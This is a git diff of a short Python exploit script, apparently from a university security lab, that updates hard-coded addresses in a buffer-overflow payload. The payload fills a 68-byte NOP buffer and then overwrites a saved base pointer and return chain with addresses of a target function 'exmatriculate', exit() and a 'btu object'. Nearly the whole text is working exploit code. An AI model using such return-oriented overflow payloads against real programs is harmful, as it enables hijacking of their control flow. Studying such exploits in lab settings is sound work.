@@ -12,12 +12,12 @@ import sys
 content = bytearray(0x90 for i in range(68)) 
 
 # adding the basepointer address 
-base_pointer_address = 0xffffc888
+base_pointer_address = 0xffffc860
 
 content[48:52] = (base_pointer_address).to_bytes(4, byteorder='little' )
 
 
-system_addr = 0x0804b0a8 # The address of exmatriculate 
+system_addr = 0x804b100 # The address of exmatriculate 
 
 content[52:56] = (system_addr).to_bytes(4, byteorder='little' )
 
@@ -26,7 +26,7 @@ exit_addr = 0xf7b51460 # The address of exit ()
 
 content[56:60] = (exit_addr).to_bytes(4, byteorder='little' ) 
 
-btu_obj = 0x08050de0 # address of btu object. 
+btu_obj = 0x8050e00 # address of btu object. 
 content[60:64] = (btu_obj).to_bytes(4, byteorder='little') 
 
 student_addr = 1782914303   # hex value of student
